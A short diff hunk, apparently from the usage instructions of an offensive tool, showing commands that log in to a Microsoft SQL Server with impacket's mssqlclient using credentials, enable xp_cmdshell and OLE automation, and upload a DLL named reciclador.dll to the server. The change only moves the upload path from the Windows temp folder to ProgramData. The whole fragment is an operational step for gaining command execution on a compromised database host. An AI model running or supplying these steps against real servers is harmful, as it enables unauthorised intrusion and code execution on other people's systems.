@@ -41,7 +41,7 @@ Prepare
 python3 mssqlclient.py $username:$password@$ip_mssql
 SQL> enable_xp_cmdshell
 SQL> enable_ole
-SQL> upload reciclador.dll c:\windows\temp\reciclador.dll
+SQL> upload reciclador.dll c:\programdata\reciclador.dll
 SQL> exit
 ```
 
